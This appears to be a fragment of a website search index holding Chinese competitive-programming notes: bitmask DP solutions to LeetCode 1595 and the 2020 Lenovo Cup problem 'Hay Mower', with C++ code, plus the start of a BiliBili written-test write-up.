\u8fde\u63a5\u65b0\u7684\u8fb9\uff0c\u5f97\u5230\u65b0\u8fb9\u7684\u6743\u503c sum \uff0c\u53d6\u6700\u5c0f\u503c\u3002 temp[nextState] = min(temp[nextState], dp[state] + sum)","title":"2.1. \u89e3\u6cd5\u4e00"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#22","text":"dp[i][s] \u8868\u793a\u5de6\u8fb9\u524d i \u4e2a\u70b9\uff0c\u53f3\u8fb9\u70b9\u8fde\u63a5\u72b6\u51b5\u4e3a s \u7684\u6700\u5c0f cost \u3002 \u4e09\u91cd\u5faa\u73af\uff0c\u548c Floyd \u7b97\u6cd5\u7684\u601d\u60f3\u6709\u70b9\u7c7b\u4f3c\u3002 Floyd \u7b97\u6cd5\u662f\u904d\u5386\u6bcf\u4e2a\u70b9\uff0c\u5224\u65ad\u628a\u8fd9\u4e2a\u70b9\u4f5c\u4e3a\u67d0\u6761\u8def\u5f84\u7684\u4e2d\u95f4\u7ed3\u70b9\u662f\u5426\u80fd\u7f29\u77ed\u8def\u5f84\u957f\u5ea6\u3002 \u8fd9\u91cc\u662f\u904d\u5386\u53f3\u8fb9\u7684\u6bcf\u4e2a\u70b9\uff0c\u5224\u65ad\u628a\u5b83\u548c i - 1 \u70b9 \u76f8\u8fde\u7684\u6700\u5c0f\u6210\u672c\uff0c\u5373\u5c06 cost[i - 1][j] \u4e0e dp[i - 1][s] \u6216 dp[i][s] \u76f8\u52a0\u6240\u5f97\u7684\u548c\u7684\u6700\u5c0f\u503c\u3002 \u6bd4\u5982 \u88681 \u4e2d\u7684 dp[2][(111)B] \uff0c\u53ef\u4ee5\u7531 dp[1][(011)B] + cost[1][2] \u5f97\u5230\uff0c\u4e5f\u53ef\u4ee5\u7531 dp[2][(011)B] + cost[1][2] \u5f97\u5230\uff0c\u7531\u4e8e dp[2][(011)B] < dp[1][(011)B] \uff0c\u6700\u7ec8\u7ed3\u679c\u4e3a 3 \u3002 for (int i = 1; i <= n; i++) // \u679a\u4e3e\u5de6\u8fb9\u6bcf\u4e2a\u70b9 for (int s = 0; s < lim; s++) // \u679a\u4e3e\u53f3\u8fb9\u7684\u8fde\u63a5\u72b6\u6001 for (int j = 0; j < m; j++) // \u679a\u4e3e\u8fde\u63a5\u53f3\u8fb9\u7684\u70b9 // \u8fde\u63a5\u4e00\u6761\u8fb9\uff0c\u5f97\u5230\u65b0\u72b6\u6001 dp[i][s | (1 << j)] = min({ dp[i][s | (1 << j)], dp[i - 1][s] + cost[i - 1][j], // \u7528\u524di-1\u4e2a\u70b9\u8fde\u6210s\u72b6\u6001\uff0c\u8fdb\u884c\u9012\u63a8 dp[i][s] + cost[i - 1][j] }); // \u7528\u524di\u4e2a\u70b9\u8fde\u6210s\u72b6\u6001\uff0c\u8fdb\u884c\u9012\u63a8","title":"2.2. \u89e3\u6cd5\u4e8c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%8A%B6%E5%8E%8BDP/1.LeetCode_1595_%E8%BF%9E%E9%80%9A%E4%B8%A4%E7%BB%84%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/#3","text":"\u4ee3\u7801\u53c2\u8003\u81ea \u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 // \u89e3\u6cd5\u4e00 class Solution { public: int connectTwoGroups(vector<vector<int>>& cost) { int size1 = cost.size(), size2 = cost[0].size(), stateNum = 1 << size2; //stateNum\u4e3a\u7b2c\u4e8c\u7ec4\u603b\u7684\u72b6\u6001\u6570+1 vector<int> dp(stateNum, INT_MAX); //dp\u6570\u7ec4\u521d\u59cb\u5316\u4e3a\u5f88\u5927\u7684\u6570 dp[0] = 0; //\u521d\u59cb\u72b6\u6001 for (int i = 0; i < size1; ++i) { //\u8fed\u4ee3\u6bcf\u4e00\u884c vector<int> temp(stateNum, INT_MAX); //\u6eda\u52a8\u6570\u7ec4 for (int state = 0; state < stateNum; ++state) { //\u679a\u4e3e\u6240\u6709\u72b6\u6001 if (dp[state] == INT_MAX) continue; //\u82e5\u72b6\u6001\u4e0d\u53ef\u8fbe\uff0ccontinue for (int j = 0; j < size2; ++j) { //\u65b9\u6848\u4e00\uff1a\u4efb\u9009\u4e00\u6761\u8fb9\u76f8\u8fde int nextState = state | (1 << j); //\u76f8\u8fde\u540e\u5230\u8fbe\u7684\u72b6\u6001 temp[nextState] = min(temp[nextState], dp[state] + cost[i][j]); //\u66f4\u65b0\u6700\u5c0f\u82b1\u8d39 } int flipState = (stateNum - 1) ^ state; //\u65b9\u6848\u4e8c\uff1a\u8fde\u63a5\u82e5\u5e72\u672a\u8fde\u63a5\u7684\u8fb9\uff0c\u4f7f\u7528\u5f02\u6216\u8fdb\u884c\u4f4d\u53cd\u8f6c\u5f97\u5230\u6240\u6709\u672a\u8fde\u63a5\u7684\u8fb9 for (int subState = flipState; subState; subState = flipState & (subState - 1)) { //\u679a\u4e3e\u672a\u8fde\u63a5\u7684\u8fb9\u7684\u5b50\u96c6 int nextState = state | subState; //\u76f8\u8fde\u540e\u5230\u8fbe\u7684\u72b6\u6001 if (nextState > state) { // \u82e5\u6dfb\u52a0\u4e86\u65b0\u8fb9 int sum = 0; //\u8bb0\u5f55\u82b1\u8d39 for (int k = 0; k < size2; ++k) //\u679a\u4e3esize2 if (subState & (1 << k)) sum += cost[i][k]; //\u82e5\u5b50\u96c6\u4e2d\u5b58\u5728\u8be5\u8fb9\uff0c\u5219\u66f4\u65b0\u82b1\u8d39 temp[nextState] = min(temp[nextState], dp[state] + sum); //\u66f4\u65b0\u6700\u5c0f\u82b1\u8d39 } } } dp = move(temp); //\u6eda\u52a8\u6570\u7ec4 } return dp.back(); //\u8fd4\u56de\u7ed3\u679c } }; \u4ee3\u7801\u53c2\u8003\u81ea \u53e6\u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 // \u89e3\u6cd5\u4e8c int dp[15][1 << 12 + 5]; class Solution { public: int connectTwoGroups(vector<vector<int>>& cost) { int n = cost.size(), m = cost[0].size(); int lim = 1 << m; // \u521d\u59cb\u5316 for (int i = 0; i <= n; i++) for (int s = 0; s < lim; ++s) dp[i][s] = INT_MAX; dp[0][0] = 0; // DP for (int i = 1; i <= n; i++) // \u679a\u4e3e\u5de6\u8fb9\u6bcf\u4e2a\u70b9 for (int s = 0; s < lim; s++) // \u679a\u4e3e\u53f3\u8fb9\u7684\u8fde\u63a5\u72b6\u6001 for (int j = 0; j < m; j++) // \u679a\u4e3e\u8fde\u63a5\u53f3\u8fb9\u7684\u70b9 // \u8fde\u63a5\u4e00\u6761\u8fb9\uff0c\u5f97\u5230\u65b0\u72b6\u6001 dp[i][s | (1 << j)] = min({ dp[i][s | (1 << j)], dp[i - 1][s] + cost[i - 1][j], // \u7528\u524di-1\u4e2a\u70b9\u8fde\u6210s\u72b6\u6001\uff0c\u8fdb\u884c\u9012\u63a8 dp[i][s] + cost[i - 1][j] }); // \u7528\u524di\u4e2a\u70b9\u8fde\u6210s\u72b6\u6001\uff0c\u8fdb\u884c\u9012\u63a8 return dp[n][lim - 1]; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/","text":"2020 \u5e74 \u201c\u8054\u60f3\u676f\u201d\u5168\u56fd\u9ad8\u6821\u7a0b\u5e8f\u8bbe\u8ba1\u5728\u7ebf\u9080\u8bf7\u8d5b\u66a8\u7b2c\u4e09\u5c4a\u4e0a\u6d77\u7406\u5de5\u5927\u5b66\u7a0b\u5e8f\u8bbe\u8ba1\u7ade\u8d5b H. Hay Mower # \u76ee\u5f55 # 2020 \u5e74 \u201c\u8054\u60f3\u676f\u201d\u5168\u56fd\u9ad8\u6821\u7a0b\u5e8f\u8bbe\u8ba1\u5728\u7ebf\u9080\u8bf7\u8d5b\u66a8\u7b2c\u4e09\u5c4a\u4e0a\u6d77\u7406\u5de5\u5927\u5b66\u7a0b\u5e8f\u8bbe\u8ba1\u7ade\u8d5b H. Hay Mower \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1 1.6. Sample Output 1 1.7. Sample Input 2 1.8. Sample Output 2 1.10. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2.0 sec Memory Limit: 256 MB 1.2. Problem Description # Are you tired of city life? Have you ever had illusions of pastoral peace? The clean atmosphere, the closeness to nature and the gentle pace of living, all made Setsuna yearn for the pastoral life more. In order to experience the simple pastoral life, Setsuna has moved to Star Valley and started her farming journey. Soon, she discovers the problem: overgrown weeds are harming her farm. In Chinese, we call it \u201cSheng Cao\u201d. She realized that weeding should be put at the top priority. The farm can be described as an n \\times m matrix. The growth rate of weed in row i and column j is denoted as a_{i,j} , indicating that the weed will grow a_{i,j} units every beginning of the moment. At the end of moment 0 , there is no weed on the farm. Setsuna will use mower k times, where the i -th use occurs at the end of moment t_i . Each use of the mower completely removes weeds in a row or column. Setsuna wonders how many units of weed she will remove. The answer might be very large, so please output the desired answer modulo 998244353 . 1.3. Input # The first line contains three integers n,m,k(1\\le n,m \\le 500,1 \\le k \\le 3 \\times 10^5) . The next n lines contains m integers each, where the j -th integer of the i -th line is a_{i,j} (0 \\le a_{i,j} \\le 10^{18}) . The i -th of the next k lines contains one character and twointegers. r x_i t_i - Setsuna clears the weeds in row x_i at the end of moment t_i . c y_i t_i - Setsuna clears the weeds in column yi at the end of moment t_i . For each test case output a single line containing \"YES\" if it is possible to solve the jigsaw puzzle, or \"NO\" otherwise. You can print each letter in any case (upper or lower). It is guaranteed that 1 \\le x_i \\le n,1 \\le y_i \\le m,1 \\le t_i \\le 10^{18} hold for 1 \\le i \\le k and t_i is strictly increasing. 1.4. Output # Output one integer indicating the answer modulo 998244353 . 1.5. Sample Input 1 # 2 2 3 1 2 3 4 r 1 5 c 2 6 r 1 7 1.6. Sample Output 1 # 45 1.7. Sample Input 2 # 3 4 1 1 2 3 4 5 6 7 8 9 10 11 12 r 1 1000000000000000000 1.8. Sample Output 2 # 172998509 1.10. Source # 2020 \u5e74 \u201c\u8054\u60f3\u676f\u201d\u5168\u56fd\u9ad8\u6821\u7a0b\u5e8f\u8bbe\u8ba1\u5728\u7ebf\u9080\u8bf7\u8d5b\u66a8\u7b2c\u4e09\u5c4a\u4e0a\u6d77\u7406\u5de5\u5927\u5b66\u7a0b\u5e8f\u8bbe\u8ba1\u7ade\u8d5b H. Hay Mower 2. \u89e3\u8bfb # \u76f4\u63a5\u7528\u4e8c\u7ef4\u6570\u7ec4\u5b58\u77e9\u9635\uff0c\u7136\u540e\u5728\u6bcf\u4e2a t_i \u5bf9\u6574\u4e2a\u77e9\u9635\u8fdb\u884c\u66f4\u65b0\u7684\u8bdd\u4f1a\u8d85\u65f6\u3002 \u901a\u8fc7\u5bf9\u9898\u76ee\u518d\u8fdb\u884c\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6bcf\u6b21\u5bf9\u77e9\u9635\u8fdb\u884c\u64cd\u4f5c\u65f6\u53ea\u5f71\u54cd\u5230\u67d0\u4e00\u884c\u6216\u67d0\u4e00\u5217\uff0c\u6240\u4ee5\u6211\u4eec\u7528 timeMatrix \u5b58\u50a8\u4e0a\u4e00\u6b21\u66f4\u65b0\u65f6\u95f4\uff0c\u5728\u6bcf\u4e2a t_i \u5bf9\u5176\u64cd\u4f5c\u7684\u884c\u6216\u5217\u8fdb\u884c\u8fd0\u7b97\uff0c\u5c06\u8be5\u884c/\u5217\u5728 t_i - t_{i-1} \u65f6\u95f4\u5185\u65b0\u589e\u52a0\u7684\u6570\u503c\u7d2f\u52a0\u5c31\u5f97\u5230\u4e86\u7b54\u6848\uff0c\u7136\u540e\u5c06 timeMatrix \u5b58\u50a8\u7684\u4e0a\u4e00\u6b21\u66f4\u65b0\u65f6\u95f4\u8d4b\u503c\u4e3a t_i \u5373\u53ef\u3002 \u8fd8\u6709\u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u5c31\u662f\u6bcf\u6b21\u76f8\u4e58\u8fd0\u7b97\u90fd\u8981\u5148\u5bf9\u4e24\u4e2a\u6570\u53d6\u6a21\uff0c\u4e0d\u7136\u7279\u522b\u5bb9\u6613\u6ea2\u51fa\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <map> #include <math.h> #include <string.h> #include <vector> using namespace std; const int NUM = 500 + 1; const long long mod = 998244353; long long timeMatrix[NUM][NUM] = { { 0 } }; long long growMatrix[NUM][NUM] = { { 0 } }; map<long long, pair<char, long long>> mp; int main() { long long n, m, k, ans = 0; scanf(\"%lld %lld %lld\", &n, &m, &k); long long ai, aj, mark, t, lastMoment, moment = 0; char ch; for (int i = 1; i <= n; i++) { for (int j = 1; j <= m; j++) { scanf(\"%lld\", &growMatrix[i][j]); } } // \u8bfb\u6362\u884c\u7b26 getchar(); while (k--) { ch = getchar(); scanf(\"%lld %lld\\n\", &ai, &aj); mp[aj] = make_pair(ch, ai); } // \u8ba1\u7b97 for (auto it = mp.begin(); it != mp.end(); it++) { t = it->first; ch = it->second.first; mark = it->second.second; // \u884c if (ch == 'r') { for (int i = 1; i <= m; i++) { ans = (ans + ((t - timeMatrix[mark][i]) % mod) * (growMatrix[mark][i] % mod)) % mod; timeMatrix[mark][i] = t; } } else { // \u5217 for (int j = 1; j <= n; j++) { ans = (ans + ((t - timeMatrix[j][mark]) % mod) * (growMatrix[j][mark] % mod)) % mod; timeMatrix[j][mark] = t; } } } printf(\"%lld\\n\", ans); return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.2020\u8054\u60f3\u676f H Hay Mower"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#2020-h-hay-mower","text":"","title":"2020 \u5e74 \u201c\u8054\u60f3\u676f\u201d\u5168\u56fd\u9ad8\u6821\u7a0b\u5e8f\u8bbe\u8ba1\u5728\u7ebf\u9080\u8bf7\u8d5b\u66a8\u7b2c\u4e09\u5c4a\u4e0a\u6d77\u7406\u5de5\u5927\u5b66\u7a0b\u5e8f\u8bbe\u8ba1\u7ade\u8d5b H. Hay Mower"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#_1","text":"2020 \u5e74 \u201c\u8054\u60f3\u676f\u201d\u5168\u56fd\u9ad8\u6821\u7a0b\u5e8f\u8bbe\u8ba1\u5728\u7ebf\u9080\u8bf7\u8d5b\u66a8\u7b2c\u4e09\u5c4a\u4e0a\u6d77\u7406\u5de5\u5927\u5b66\u7a0b\u5e8f\u8bbe\u8ba1\u7ade\u8d5b H. Hay Mower \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1 1.6. Sample Output 1 1.7. Sample Input 2 1.8. Sample Output 2 1.10. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#11-limit","text":"Time Limit: 2.0 sec Memory Limit: 256 MB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#12-problem-description","text":"Are you tired of city life? Have you ever had illusions of pastoral peace? The clean atmosphere, the closeness to nature and the gentle pace of living, all made Setsuna yearn for the pastoral life more. In order to experience the simple pastoral life, Setsuna has moved to Star Valley and started her farming journey. Soon, she discovers the problem: overgrown weeds are harming her farm. In Chinese, we call it \u201cSheng Cao\u201d. She realized that weeding should be put at the top priority. The farm can be described as an n \\times m matrix. The growth rate of weed in row i and column j is denoted as a_{i,j} , indicating that the weed will grow a_{i,j} units every beginning of the moment. At the end of moment 0 , there is no weed on the farm. Setsuna will use mower k times, where the i -th use occurs at the end of moment t_i . Each use of the mower completely removes weeds in a row or column. Setsuna wonders how many units of weed she will remove. The answer might be very large, so please output the desired answer modulo 998244353 .","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#13-input","text":"The first line contains three integers n,m,k(1\\le n,m \\le 500,1 \\le k \\le 3 \\times 10^5) . The next n lines contains m integers each, where the j -th integer of the i -th line is a_{i,j} (0 \\le a_{i,j} \\le 10^{18}) . The i -th of the next k lines contains one character and twointegers. r x_i t_i - Setsuna clears the weeds in row x_i at the end of moment t_i . c y_i t_i - Setsuna clears the weeds in column yi at the end of moment t_i . For each test case output a single line containing \"YES\" if it is possible to solve the jigsaw puzzle, or \"NO\" otherwise. You can print each letter in any case (upper or lower). It is guaranteed that 1 \\le x_i \\le n,1 \\le y_i \\le m,1 \\le t_i \\le 10^{18} hold for 1 \\le i \\le k and t_i is strictly increasing.","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#14-output","text":"Output one integer indicating the answer modulo 998244353 .","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#15-sample-input-1","text":"2 2 3 1 2 3 4 r 1 5 c 2 6 r 1 7","title":"1.5. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#16-sample-output-1","text":"45","title":"1.6. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#17-sample-input-2","text":"3 4 1 1 2 3 4 5 6 7 8 9 10 11 12 r 1 1000000000000000000","title":"1.7. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#18-sample-output-2","text":"172998509","title":"1.8. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#110-source","text":"2020 \u5e74 \u201c\u8054\u60f3\u676f\u201d\u5168\u56fd\u9ad8\u6821\u7a0b\u5e8f\u8bbe\u8ba1\u5728\u7ebf\u9080\u8bf7\u8d5b\u66a8\u7b2c\u4e09\u5c4a\u4e0a\u6d77\u7406\u5de5\u5927\u5b66\u7a0b\u5e8f\u8bbe\u8ba1\u7ade\u8d5b H. Hay Mower","title":"1.10. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#2","text":"\u76f4\u63a5\u7528\u4e8c\u7ef4\u6570\u7ec4\u5b58\u77e9\u9635\uff0c\u7136\u540e\u5728\u6bcf\u4e2a t_i \u5bf9\u6574\u4e2a\u77e9\u9635\u8fdb\u884c\u66f4\u65b0\u7684\u8bdd\u4f1a\u8d85\u65f6\u3002 \u901a\u8fc7\u5bf9\u9898\u76ee\u518d\u8fdb\u884c\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6bcf\u6b21\u5bf9\u77e9\u9635\u8fdb\u884c\u64cd\u4f5c\u65f6\u53ea\u5f71\u54cd\u5230\u67d0\u4e00\u884c\u6216\u67d0\u4e00\u5217\uff0c\u6240\u4ee5\u6211\u4eec\u7528 timeMatrix \u5b58\u50a8\u4e0a\u4e00\u6b21\u66f4\u65b0\u65f6\u95f4\uff0c\u5728\u6bcf\u4e2a t_i \u5bf9\u5176\u64cd\u4f5c\u7684\u884c\u6216\u5217\u8fdb\u884c\u8fd0\u7b97\uff0c\u5c06\u8be5\u884c/\u5217\u5728 t_i - t_{i-1} \u65f6\u95f4\u5185\u65b0\u589e\u52a0\u7684\u6570\u503c\u7d2f\u52a0\u5c31\u5f97\u5230\u4e86\u7b54\u6848\uff0c\u7136\u540e\u5c06 timeMatrix \u5b58\u50a8\u7684\u4e0a\u4e00\u6b21\u66f4\u65b0\u65f6\u95f4\u8d4b\u503c\u4e3a t_i \u5373\u53ef\u3002 \u8fd8\u6709\u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u5c31\u662f\u6bcf\u6b21\u76f8\u4e58\u8fd0\u7b97\u90fd\u8981\u5148\u5bf9\u4e24\u4e2a\u6570\u53d6\u6a21\uff0c\u4e0d\u7136\u7279\u522b\u5bb9\u6613\u6ea2\u51fa\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C/1.2020%E8%81%94%E6%83%B3%E6%9D%AF_H_Hay_Mower/#3","text":"#include <algorithm> #include <iostream> #include <map> #include <math.h> #include <string.h> #include <vector> using namespace std; const int NUM = 500 + 1; const long long mod = 998244353; long long timeMatrix[NUM][NUM] = { { 0 } }; long long growMatrix[NUM][NUM] = { { 0 } }; map<long long, pair<char, long long>> mp; int main() { long long n, m, k, ans = 0; scanf(\"%lld %lld %lld\", &n, &m, &k); long long ai, aj, mark, t, lastMoment, moment = 0; char ch; for (int i = 1; i <= n; i++) { for (int j = 1; j <= m; j++) { scanf(\"%lld\", &growMatrix[i][j]); } } // \u8bfb\u6362\u884c\u7b26 getchar(); while (k--) { ch = getchar(); scanf(\"%lld %lld\\n\", &ai, &aj); mp[aj] = make_pair(ch, ai); } // \u8ba1\u7b97 for (auto it = mp.begin(); it != mp.end(); it++) { t = it->first; ch = it->second.first; mark = it->second.second; // \u884c if (ch == 'r') { for (int i = 1; i <= m; i++) { ans = (ans + ((t - timeMatrix[mark][i]) % mod) * (growMatrix[mark][i] % mod)) % mod; timeMatrix[mark][i] = t; } } else { // \u5217 for (int j = 1; j <= n; j++) { ans = (ans + ((t - timeMatrix[j][mark]) % mod) * (growMatrix[j][mark] % mod)) % mod; timeMatrix[j][mark] = t; } } } printf(\"%lld\\n\", ans); return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/","text":"2021\u5c4aBiliBili\u6821\u62db \u6570\u636e\u5206\u6790/\u540e\u7aef\u5f00\u53d1 \u7b14\u8bd5\u9898\u8bb0\u5f55 # \u76ee\u5f55 # [toc] 1. \u80cc\u666f # \u6700\u8fd1\u505a\u4e86BiliBili2021\u5c4a\u6821\u62db\u6570\u636e\u5206\u6790\u5c97\u7684\u7b14\u8bd5\u9898\uff0c\u548c\u540e\u7aef\u5f00\u53d1\u662f\u540c\u4e00\u5957\u9898\uff0c\u4e4b\u524d\u5728\u627e\u76f8\u5173\u8d44\u6599\u7684\u65f6\u5019\u6ca1\u6709\u53d1\u73b0\u6570\u636e\u5206\u6790\u7b14\u8bd5\u9898\u578b\u7684\u4fe1\u606f\uff0c\u4e8e\u662f\u505a\u5b8c\u4ee5\u540e\u53d1\u4e2a\u5e16\u51fa\u6765\u7ed9\u5927\u5bb6\u53c2\u8003\u3002 2. \u9898\u578b # \u65f6\u95f4\u4e00\u5171\u662f105\u5206\u949f\uff0c30\u9053\u9009\u62e9\u9898\uff0c\u517160\u5206\uff0c3\u9053\u7b97\u6cd5\u9898\uff0c\u517160\u5206\uff0c\u52a0\u8d77\u6765120\u5206\u3002 \u672c\u6765\u7ed9\u7b97\u6cd5\u9898\u6bcf\u9898\u5206\u4e8620\u5206\u949f\uff0c\u6bcf\u9053\u9009\u62e9\u9898\u5927\u69821-2\u5206\u949f\uff0c\u6700\u540e\u505a\u5b8c\u9009\u62e9\u9898\u8fd8\u5269\u4e0b70\u5206\u949f\uff0c\u4eca\u5e74\u7b97\u6cd5\u9898\u975e\u5e38\u7b80\u5355\uff0c\u63d0\u524d25\u5206\u949f\u505a\u5b8c\u4e86\uff0c\u611f\u89c9\u9009\u62e9\u9898\u662f\u91cd\u70b9\u3002 3. \u9009\u62e9\u9898\u8303\u56f4 # 